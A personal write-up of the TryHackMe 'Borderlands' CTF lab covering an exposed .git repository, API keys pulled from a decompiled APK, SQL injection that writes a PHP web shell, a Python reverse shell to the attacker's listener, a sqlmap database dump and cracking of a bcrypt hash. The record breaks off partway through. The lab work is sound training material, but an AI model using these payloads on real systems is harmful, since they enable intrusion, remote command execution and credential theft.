<p>Networking . BGP, Border Gateway Protocol . Exploitation</p>

<h1 align="center">Borderlands</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/50f2e14c-9749-43f9-83e6-cfe315476f8b"><br>
August 31, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>482</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Compromise a perimeter host and pivot through this network.</em>.<br>
Access it <a href="https://tryhackme.com/room/borderlands"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/8b99b5cf-a92e-4ff9-905a-bb976bf8a08b"></p>


<br>

<p align="left">Summary &nbsp;&nbsp;<br>
    
- [Nmap](#1)<br>
- [API Key "AND*"](#2)<br>
- [API Key "WEB*"](#3)<br>
- [API Key "GIT*"](#4)<br>
- [/var/www within web app host](#5)<br>
- [/root/ within Router1](#6)<br>
- [Transmission from server to client over UDP](#7)<br>
- [Transmission from server to client over TCP](#8)</p>
    
<h2>Task 1 . Deploy, attack and pivot through this network</h2>
<p>This challenge was created by Context Information Security for TryHackMe HackBack2, a cy</p>

<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/72538409-4583-4c68-9732-122669fb9181"><br>Deploy the network and answer the questions below.<br>Some questions will show [X] next to them. This means the question is worth X extra points.</h6>

<p><em>Answer the questions below</em></p>


<br>
<br>
<br>
<br>
<h2 align="center">Nmap<a id='1'></a></h2>
<p>

- 22 : SSH<br>
- 80 : HTTP : nginx 1.14.0<br> xx.xxx.xx.xx:80/.git<br></p>

```bash
:~/Borderlands# nmap -p- xx.xxx.xx.xx
```


<h2 align="center">API Key "AND*"<a id='2'></a></h2>
<br>
<h3 align="center">Web port 80</h3>
<p  align="center">403 Forbidden</p>
<br>
<br>
<h3 align="center">apktool</h3>
<p  align="center">Downloaded the APK <code>mobile-app-prototype.apk</code> from the Web Application clicking <code>here</code>.</p>

<p align = "center"><img width="800px" src="https://github.com/user-attachments/assets/5adc39ba-8e0f-4623-81aa-005e5da10c7e"></p>

```bash
:~/Borderlands# ls
mobile-app-prototype.apk
```

<br>
<br>
<p  align="center">Installed <code>apktool</code>.</p>

```bash
:~/Borderlands# apt install apktool
```

<br>
<br>
<p  align="center">Executed <code>apktool</code> to decompile <code>mobile-app-prototype.apk</code>.</p>

```bash
:~/Borderlands# apktool d mobile-app-prototype.apk
I: Using Apktool 2.4.0-dirty on mobile-app-prototype.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: .../.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

<p align = "center"><img width="800px" src="https://github.com/user-attachments/assets/a935e1d0-7520-412c-a665-ccd845abf3c9"></p>

<br>
<br>
<p  align="center">Checked the decompiled content.</p>

```bash
:~/Borderlands/mobile-app-prototype/res/values# ls
attrs.xml  bools.xml  colors.xml  dimens.xml  drawables.xml  ids.xml  integers.xml  public.xml  strings.xml  styles.xml
```

<br>
<br>
<p  align="center">Discovered the encrypted API Key using <code>grep</code>.</p>

```bash
:~/Borderlands/mobile-app-prototype/res/values# grep -rn key
ids.xml:77:    <item type="id" name="tag_unhandled_key_event_manager" />
ids.xml:78:    <item type="id" name="tag_unhandled_key_listeners" />
public.xml:163:    <public type="attr" name="keylines" id="0x7f020094" />
public.xml:220:    <public type="attr" name="layout_keyline" id="0x7f0200cd" />
public.xml:628:    <public type="drawable" name="abc_menu_hardkey_panel_mtrl_mult" id="0x7f060035" />
public.xml:785:    <public type="id" name="tag_unhandled_key_event_manager" id="0x7f070084" />
public.xml:786:    <public type="id" name="tag_unhandled_key_listeners" id="0x7f070085" />
public.xml:892:    <public type="string" name="encrypted_api_key" id="0x7f0b0028" />
styles.xml:401:        <item name="panelBackground">@drawable/abc_menu_hardkey_panel_mtrl_mult</item>
styles.xml:542:        <item name="panelBackground">@drawable/abc_menu_hardkey_panel_mtrl_mult</item>
attrs.xml:213:    <attr name="keylines" format="reference" />
attrs.xml:352:    <attr name="layout_keyline" format="integer" />
strings.xml:43:    <string name="encrypted_api_key">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</string>
```

<br>
<br>
<p  align="center">Discovered the API Key "AND*" using <code>CyberChef</code> and the Key.</p>

<p align = "center"><img width="800px" src="https://github.com/user-attachments/assets/ee87b70e-17a0-4b1b-83c0-21b63ee9e986"></p>

<br>

<p align = "center"><img width="800px" src="https://github.com/user-attachments/assets/39c424d7-ba9c-40af-8ff1-c34b7e5705e0"></p>

<br>
<br>
<p> 1.1. What is the API key that fits the following pattern: "AND*"<br>
<code>ANDVOWLDLAS5Q8OQZ2tuIPGcOu2mXk</code></p>

<br>
<h2 align="center">API Key "WEB*"<a id='3'></a></h2>
<h3 align="center">GitTools</h3>
<br>
<p align="center">Cloned GitTools repository.</p>

```bash
:~/Borderlands# git clone https://github.com/internetwache/GitTools
```

```bash
:~/Borderlands/GitTools# ls
Dumper  Extractor  Finder  LICENSE.md  README.md
```

```bash
:~/Borderlands/GitTools/Dumper# ls
gitdumper.sh  README.md
```

<br>
<br>
<p  align="center">Executed <code>gitdumper</code>.</p>

```bash
:~/Borderlands/GitTools/Dumper# ./gitdumper.sh http://xx.xxx.xx.xx/.git/ ~/Borderlands/xx.xxx.xx.xx/
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[+] Downloaded: HEAD

[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/6d/b3cf70b469de942f2f529166088cdfbbd5f764
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/15/2b2d9976cd37a68fd462af8e4ce21356b5485e
[+] Downloaded: objects/93/bab0a450caaa8c4d2632703636eccc69062bb4
[+] Downloaded: objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f
[+] Downloaded: objects/b2/f776a52fe81a731c6c0fa896e7f9548aafceab
[+] Downloaded: objects/04/f1f411857cc972ae8ed5efcffa298f5f6168fb
[+] Downloaded: objects/fe/e5595bb2ba1d1ab005ec3de98367fe5d021e9f
[+] Downloaded: objects/0d/487f41b42eeb061fbd3a6aec8db01e139e514d
[+] Downloaded: objects/33/7c2224b69c29a0faf3143d2da16d9bb82e91fb
[+] Downloaded: objects/bf/9d9df13bf0565a2bb75753ec50be3723c72241
[+] Downloaded: objects/51/d63292792fb7f97728cd3dcaac3ef364f374ba
[+] Downloaded: objects/f0/baf222720667090e52874204868a052ea32dc7
[+] Downloaded: objects/3e/8ebd2ecafa693a3fdb9b91e4a694d133012c3b
[+] Downloaded: objects/77/e7884c18472152e372c060a6ba40dd555a5eed
[+] Downloaded: objects/2a/bf4c29f7ae182fa75ba9914fcd47c6614a9b29
[+] Downloaded: objects/e0/03b9156c54897414bc5958372b10d76fed64bb
[+] Downloaded: objects/09/1ed908bcb54a002d3194c375570a508747dd28
[+] Downloaded: objects/15/6f4e78a91e169db2e04b65767fc732b1ce2a7a
[+] Downloaded: objects/fd/efad64c4f3be0fe33ea5837c0fe75b8ee2ef2c
[+] Downloaded: objects/eb/d082255f4278c8dd239af2f8e985e0a66746e0
[+] Downloaded: objects/9e/b9f94f73113d785e65c7e3ec0cba54e0b7cf43
[+] Downloaded: objects/2a/116a56a6e31ef1836796936dbc05af1f986a26
[+] Downloaded: objects/03/d7929200ed474bce7934ea1985f4ac74983a62
[+] Downloaded: objects/64/80abf34a54d3055b437766be872a13bcebdf7d
[+] Downloaded: objects/4c/d24129c3255a3f7e84f7d42ddd94cccd2a697b
[+] Downloaded: objects/47/0cac65fcd0f8556f13997957a331628482aa96
[+] Downloaded: objects/22/29eb414d7945688b90d7cd0a786fd888bcc6a4
[+] Downloaded: objects/4f/4ced90fcad774ca4f9f966dbb227ebe7f77a83
[+] Downloaded: objects/b9/953f00f7ad7a26460fa249e00fe05eb52d224c
```

<h3 align="center">GitHack</h3>

```bash
:~/Borderlands/GitHack# git clone https://github.com/lijiejie/GitHack
```


<h3 align="center">GitHack</h3>
<br>
<p align="center">Cloned GitHack repository.</p>

```bash
:~/Borderlands/GitHack# git clone https://github.com/lijiejie/GitHack
```

<br>
<br>
<p  align="center">Executed <code>gitdumperGitHack</code>.</p>

```bash
:~/Borderlands/GitHack# python3 GitHack.py http://xx.xxx.xx.xx/.git
[+] Download and parse index file ...
[+] CTX_WSUSpect_White_Paper.pdf
[+] Context_Red_Teaming_Guide.pdf
[+] Context_White_Paper_Pen_Test_101.pdf
[+] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
[+] Glibc_Adventures-The_Forgotten_Chunks.pdf
[+] api.php
[+] functions.php
[+] home.php
[+] index.php
[+] info.php
[OK] api.php
[OK] CTX_WSUSpect_White_Paper.pdf
[OK] Context_White_Paper_Pen_Test_101.pdf
[OK] Glibc_Adventures-The_Forgotten_Chunks.pdf
[OK] Context_Red_Teaming_Guide.pdf
[OK] functions.php
[OK] index.php
[OK] info.php
[OK] home.php
[OK] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
```

<br>
<br>
<p  align="center">Checked the content.</p>

```bash
:~/Borderlands/GitHack/xx.xxx.xx.xx# ls
api.php                               CTX_WSUSpect_White_Paper.pdf                            Glibc_Adventures-The_Forgotten_Chunks.pdf  info.php
Context_Red_Teaming_Guide.pdf         Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf  home.php
Context_White_Paper_Pen_Test_101.pdf  functions.php
```

<h3 align="center">functions.php</h3>

```bash
:~/Borderlands/GitHack/xx.xxx.xx.xx# cat functions.php
<?php

function setup_db_connection()
{
    $db_servername = "localhost";
    $db_username = "root";
    $db_password = "CCv4@he2MaHbIP7mB89TNKdei0VZ0Y";
    $db_name = "myfirstwebsite";

    // Create connection
    $conn = new mysqli($db_servername, $db_username, $db_password, $db_name);

    // Check connection
    if ($conn->connect_error) {
        die("failed to connect to the database. Something has gone horribly wrong...: " . $conn->connect_error);
    }else{
        return $conn;
    }
}

function ShowDocuments ($conn) 
{
    echo ("<p>Below you will find a list of documents that are available to download</p>");

    echo ("<ul>");

    $stmt = $conn -> prepare('SELECT documentname, location FROM documents');

    $stmt -> execute();
    $stmt -> store_result();
    $stmt -> bind_result($document_name, $location);
    
    while ($stmt -> fetch()) {
        echo ('<li><a href="'.$location.'">'.$document_name.'</a></li>');
    }
    echo ("</ul>");
}

function ShowLoggedOutView ($conn)
{
    echo ("<p>Welcome to our site. Please bear with us whilst we get everything up and running.</p>");
    
    /*
    $options = [
        'salt' => 'wWeyIzGcD7TVwZ7y7d3UCRIMYK'
    ];
    echo password_hash("hello", PASSWORD_BCRYPT, $options);
    */

    ShowDocuments($conn);


    echo ("<p>login below to edit documents</p>");

    echo ('<form method="POST">');
    echo ('username: <input type="text" name="username" id="username"><br />');
    echo ('password: <input type="password" name="password" id="password"><br />');
    echo ('<input type="submit">');
}

function CheckLogon ($conn)
{
    $options = [
        'salt' => 'wWeyIzGcD7TVwZ7y7d3UCRIMYK'
    ];
    //do logon check
    $username = $_POST['username'];
    $password = password_hash($_POST['password'], PASSWORD_BCRYPT, $options);

    $stmt = $conn->prepare("SELECT userid FROM users WHERE username=? AND password=?");
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();
    $stmt -> store_result();

    if ($stmt->num_rows == 1) {
        //echo ("logged on successfully");
        $_SESSION['loggedin'] = true;
        header("Location: home.php");
        die();
    }else{
        echo ("bad username or password");
    }
}

function UpdateDocumentName($conn, $documentid, $documentName)
{
    $sql = "update documents SET documentname='".$documentName."' WHERE documentid=".$documentid;
    //echo $sql;
    if (mysqli_query($conn, $sql)) {
        echo ('Document renamed. Click <a href="home.php">here</a> to go back');
    }else{
        echo ('Sorry. There was a problem renaming the document. Click <a href="home.php">here</a> to go back');
    }
}

function GetDocumentDetails($conn, $documentid)
{
    $sql = "select documentid, documentname, location from documents where documentid=".$documentid;
    //echo $sql;
    $result = mysqli_query($conn, $sql) or die(mysqli_error($conn));

    if (mysqli_num_rows($result) === 1) {
        return mysqli_fetch_assoc($result);
    } else {
        return null;
    }
}

?>
```

<h3 align="center">api.php</h3>

```bash
:~/Borderlands/GitHack/xx.xxx.xx.xx# cat api.php
<?php

require_once("functions.php");

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
{
    die("Invalid API key");
}

if (!isset($_GET['documentid']))
{
    die("Invalid document ID");
}

/*
if (!isset($_GET['newname']) || $_GET['newname'] == "")
{
    die("invalid document name");
}
*/

$conn = setup_db_connection();

//UpdateDocumentName($conn, $_GET['documentid'], $_GET['newname']);

$docDetails = GetDocumentDetails($conn, $_GET['documentid']);
if ($docDetails !== null)
{
    //print_r($docDetails);
    echo ("Document ID: ".$docDetails['documentid']."<br />");
    echo ("Document Name: ".$docDetails['documentname']."<br />");
    echo ("Document Location: ".$docDetails['location']."<br />");
}

?>
```


<br>
<br>
<p  align="center">Discovered the API Key "WEB*" using <code>grep</code>.</p>

```bash
:~/Borderlands/GitHack/xx.xxx.xx.xx# grep -rn WEB
home.php:26:    echo ('<li><a href="api.php?documentid='.$documentid.'&amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD">'.$document_name.'</a></li>');
home.php:41:            echo ('<input type="hidden" id="apikey" name="apikey" value="WEBLhvOJAH8d50Z4y5G5g4McG1GMGD" />');
api.php:5:if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
```

<br>
<p> 1.2. What is the API key that fits the following pattern: "WEB*"<br>
<code>WEBLhvOJAH8d50Z4y5G5g4McG1GMGD</code></p>

<br>
<h2 align="center">API Key "GIT*"<a id='4'></a></h2>
<br>
<p  align="center">I have just discovered the API Key "GIT*" in the previous step.</p>

```bash
:~/Borderlands/GitHack/xx.xxx.xx.xx# grep -rn GIT
api.php:5:if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
```

```bash
:~/Borderlands/GitHack/xx.xxx.xx.xx# grep -rn WEB
home.php:26:    echo ('<li><a href="api.php?documentid='.$documentid.'&amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD">'.$document_name.'</a></li>');
home.php:41:            echo ('<input type="hidden" id="apikey" name="apikey" value="WEBLhvOJAH8d50Z4y5G5g4McG1GMGD" />');
api.php:5:if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
```

<br>
<br>
<p  align="center">Practiced more.</p>

```bash
:~/Borderlands/xx.xxx.xx.xx/.git# ls
COMMIT_EDITMSG  config  description  HEAD  index  info  logs  objects  refs
```

<br>
<br>
<p  align="center">Identified two directories within <code>logs</code>: <code>HEAD</code> and <code>refs</code>.</p>

```bash
:~/Borderlands/xx.xxx.xx.xx/.git/logs# ls
HEAD  refs
```

<br>
<br>
<p  align="center">Practiced more.</p>

```bash
:~/Borderlands/xx.xxx.xx.xx/.git# git log
commit 6db3cf70b469de942f2f529166088cdfbbd5f764 (HEAD -> master)
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:44:31 2019 +0100

    added mobile apk for beta testing.

commit fee5595bb2ba1d1ab005ec3de98367fe5d021e9f
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:43:26 2019 +0100

    added white paper pdf's

commit 04f1f411857cc972ae8ed5efcffa298f5f6168fb
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:42:12 2019 +0100

    added theme

commit b2f776a52fe81a731c6c0fa896e7f9548aafceab
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:41:00 2019 +0100

    removed sensitive data

commit 79c9539b6566b06d6dec2755fdf58f5f9ec8822f
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:40:28 2019 +0100

    added basic prototype of api gateway

commit 93bab0a450caaa8c4d2632703636eccc69062bb4
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:33:58 2019 +0100

    added under construction page

commit 152b2d9976cd37a68fd462af8e4ce21356b5485e
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:31:11 2019 +0100

    created repo
```

```bash
:~/Borderlands/Target/.git# git cat-file -p 51d63292792fb7f97728cd3dcaac3ef364f374ba
100644 blob 2229eb414d7945688b90d7cd0a786fd888bcc6a4	api.php
100644 blob 9eb9f94f73113d785e65c7e3ec0cba54e0b7cf43	functions.php
100644 blob 2a116a56a6e31ef1836796936dbc05af1f986a26	home.php
100755 blob 470cac65fcd0f8556f13997957a331628482aa96	index.html
100644 blob 4f4ced90fcad774ca4f9f966dbb227ebe7f77a83	index.php
100644 blob 6480abf34a54d3055b437766be872a13bcebdf7d	info.php
```

<br>
<p> 1.3. What is the API key that fits the following pattern: "GIT*"<br>
<code>GITtFi80llzs4TxqMWtCotiTZpf0HC</code></p>

<br>
<br>
<p  align="center">Discovered the API Key "GIT*" using <code>git log</code>.</p>

```bash
:~/Borderlands/Target/.git# git cat-file -p 2229eb414d7945688b90d7cd0a786fd888bcc6a4
<?php

require_once("functions.php");

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtCotiTZpf0HC"))
{
    die("Invalid API key");
}

if (!isset($_GET['documentid']))
{
    die("Invalid document ID");
}

/*
if (!isset($_GET['newname']) || $_GET['newname'] == "")
{
    die("invalid document name");
}
*/

$conn = setup_db_connection();

//UpdateDocumentName($conn, $_GET['documentid'], $_GET['newname']);

$docDetails = GetDocumentDetails($conn, $_GET['documentid']);
if ($docDetails !== null)
{
    //print_r($docDetails);
    echo ("Document ID: ".$docDetails['documentid']."<br />");
    echo ("Document Name: ".$docDetails['documentname']."<br />");
    echo ("Document Location: ".$docDetails['location']."<br />");
}

?>
```

<h2 align="center">/var/www within web app host<a id='5'></a></h2>
<br>
<p> 1.4. What is the flag in the /var/www directory of the web app host? {FLAG:Webapp:XXX} <em> Hint : /var/www/flag.txt</em><br>
<code>{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}</code></p>

<p align="center">
    
- navigated to the path below<br>
- intercepted it with Burp Suite<br>
- saved the request as <code>req</code>.</p>

```bash
http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1
```

<img width="1128" height="253" alt="image" src="https://github.com/user-attachments/assets/62a9b49b-52ee-4a63-bfbc-0f514eec9d56" />

<br>
<br>
<h6>Request</h6>

```bash
GET /api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD HTTP/1.1
Host: xx.xxx.xx.xx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=fpbkohs1q3un82r41fstu5eknd
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

<h6>Response</h6>

```bash
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 9 Sep 2025 xx:xx:xx GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 124

Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
```

<br>

<img width="908" height="187" alt="image" src="https://github.com/user-attachments/assets/d50c873d-126b-4f7c-93f0-05f478c4656c" />

<br>

http:/xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1%20union%20all%20select%201,2,@@version into outfile ‘/var/www/html/whoami.html


<img width="1214" height="192" alt="image" src="https://github.com/user-attachments/assets/841773fd-8ee4-4d0e-a9b9-eed8a550d52c" />


http://10.201.65.90/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1%20union%20all%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22%20%20into%20outfile%20%22/var/www/html/rev.php%22


GET /api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1%20union%20all%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22%20%20into%20outfile%20%22/var/www/html/rev.php%22 HTTP/1.1
Host: 10.201.65.90
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=jl34o4t2fk9k5lll3a7s2du158
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Sep 2025 21:09:16 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 0


```




http://10.201.65.90/rev.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.201.71.77%22,9001));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27



:~/Borderlands# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.201.65.90 40264
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@app:~/html$ ^Z
[1]+  Stopped                 nc -nlvp 9001
root@ip-10-201-71-77:~/Borderlands# stty raw -echo; fg
nc -nlvp 9001

www-data@app:~/html$ export TERM=xterm
www-data@app:~/html$ 



www-data@app:/home$ cd /var
www-data@app:/var$ cd www 
www-data@app:~$ ll
bash: ll: command not found
www-data@app:~$ ls
flag.txt  html
www-data@app:~$ cat flag.txt
{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}




CCv4@he2MaHbIP7mB89TNKdei0VZ0Y


www-data@app:/$ ls -lah
total 72K
drwxr-xr-x   1 root root 4.0K Oct 11  2019 .
drwxr-xr-x   1 root root 4.0K Oct 11  2019 ..
-rwxr-xr-x   1 root root    0 Oct 11  2019 .dockerenv
drwxr-xr-x   1 root root 4.0K Oct  8  2019 bin
drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
drwxr-xr-x   5 root root  340 Sep  9 20:17 dev
drwxr-xr-x   1 root root 4.0K Oct 11  2019 etc
drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
drwxr-xr-x   1 root root 4.0K May 23  2017 lib
drwxr-xr-x   2 root root 4.0K Sep 12  2019 lib64
drwxr-xr-x   2 root root 4.0K Sep 12  2019 media
drwxr-xr-x   2 root root 4.0K Sep 12  2019 mnt
drwxr-xr-x   2 root root 4.0K Sep 12  2019 opt
dr-xr-xr-x 159 root root    0 Sep  9 20:17 proc
drwx------   2 root root 4.0K Sep 12  2019 root
drwxr-xr-x   1 root root 4.0K Oct 11  2019 run
drwxr-xr-x   1 root root 4.0K Oct  8  2019 sbin
drwxr-xr-x   2 root root 4.0K Sep 12  2019 srv
dr-xr-xr-x  13 root root    0 Sep  9 20:17 sys
drwxrwxrwt   1 root root 4.0K Sep  9 20:18 tmp
drwxr-xr-x   1 root root 4.0K Sep 12  2019 usr
drwxr-xr-x   1 root root 4.0K Oct  8  2019 var






www-data@app:/$ ss
NetidState Recv-Q Send-Q               Local Address:Port    Peer Address:Port  
u_strESTAB 8      0         /run/php/php7.2-fpm.sock 36762              * 0     
u_strESTAB 0      0                                * 24646              * 24647 
u_strESTAB 0      0                                * 24742              * 24743 
u_strESTAB 0      0                                * 24647              * 24646 
u_strESTAB 0      0                                * 24743              * 24742 
tcp  ESTAB 0      0                       172.18.0.2:40264   10.201.71.77:9001  




www-data@app:/$ hostname
app.ctx.ctf



www-data@app:/$ ip route
default via 172.18.0.1 dev eth0 
172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 




www-data@app:/$ getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
172.18.0.2      app.ctx.ctf app
172.16.1.10     app.ctx.ctf app






<h3 align="center">sqlmap</h3>

```bash
:~/Borderlands# sqlmap -r request.txt --risk=3 --level=3 --dump --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: documentid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND 1278=1278

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 8449 FROM(SELECT COUNT(*),CONCAT(0x7178626b71,(SELECT (ELT(8449=8449,1))),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=-2023 UNION ALL SELECT CONCAT(0x7178626b71,0x587a574543766d6e55636f7341664959665072586a674c77546c446f4159734348436f776a416d48,0x7171627171),NULL,NULL-- -
---
...                                        
Database: myfirstwebsite
Table: users
[1 entry]
+--------+----------+--------------------------------------------------------------+
| userid | username | password                                                     |
+--------+----------+--------------------------------------------------------------+
| 1      | billg    | $2y$10$wWeyIzGcD7TVwZ7y7d3UCO5eEssZShTQzBU2yIebvvQQw1y676zVW |
+--------+----------+--------------------------------------------------------------+

...
Database: myfirstwebsite                                                                                                             
Table: documents
[5 entries]
+------------+--------------------------------------------------------+--------------------------------------------------------+
| documentid | location                                               | documentname                                           |
+------------+--------------------------------------------------------+--------------------------------------------------------+
| 1          | Context_Red_Teaming_Guide.pdf                          | Context_Red_Teaming_Guide.pdf                          |
| 2          | Context_White_Paper_Pen_Test_101.pdf                   | Context_White_Paper_Pen_Test_101.pdf                   |
| 3          | CTX_WSUSpect_White_Paper.pdf                           | CTX_WSUSpect_White_Paper.pdf                           |
| 4          | Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf | Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf |
| 5          | Glibc_Adventures-The_Forgotten_Chunks.pdf              | Glibc_Adventures-The_Forgotten_Chunks.pdf              |
+------------+--------------------------------------------------------+--------------------------------------------------------+
```

<p align="center"><code>billg</code> : <code>$2y$10$wWeyIzGcD7TVwZ7y7d3UCO5eEssZShTQzBU2yIebvvQQw1y676zVW</code></p>

<h3 align="center">John The Ripper</h3>

```bash
:~/Borderlands# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
potato           (?)
1g 0:00:01:17 DONE (2025-07-21 00:28) 0.01298g/s 38.33p/s 38.33c/s 38.33C/s raluca..maricar
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


<br>

<br>
<h3 align="center">Testing the suggested payloads to practice</h3>

```bash
